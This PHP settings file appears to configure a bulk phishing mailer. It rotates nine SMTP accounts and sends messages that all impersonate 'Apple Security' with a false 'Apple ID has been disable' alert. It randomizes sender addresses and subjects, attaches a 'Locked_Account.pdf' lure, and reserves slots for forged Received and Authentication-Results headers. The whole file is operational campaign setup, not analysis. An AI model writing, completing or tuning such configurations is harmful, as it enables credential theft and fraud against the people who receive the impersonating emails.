<?php

// setting all needs here

$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18971@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18972@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18973@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18974@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18975@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18976@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18977@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18978@i-forgotappsaccount.business", "password" => "11111111" ];
$settings['multy']['smtp'][]    = [ "host" => "smtp.gmail.com", "port" => "587", "security" => "tls", "username" => "noreply.mailservicestore18979@i-forgotappsaccount.business", "password" => "11111111" ];

$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];
$settings['multy']['message'][] = [ "subject" => "[ Alert Notification ] Your Apple ID has been disable for security reason! ##random_mix_10##", "email" => "##random_string_low_10##@##random_string_low_10##.com", "name" => "Apple Security" ];

$settings['main'] = [

        "delay_after"       => "5",
        "delay"             => "5",
        "html_file"         => "letter.html",
        "mailist_file"      => "mailist.txt",
        "attachment"        => "Locked_Account.pdf",
        "attachment_rename" => "Locked_Account.pdf",
        "charset"           => "iso-8859-1",
        "encoding"          => "8bit",
        
];

$settings['headers'] = [

        'X-Originating-IP' => 'xx',
        'Authentication-Results' => 'xx',
        'Received' => 'xxx',

];

$settings['links'] = [

        "http://google.com",
        "http://yahoo.com",
        "http://youtube.com",

];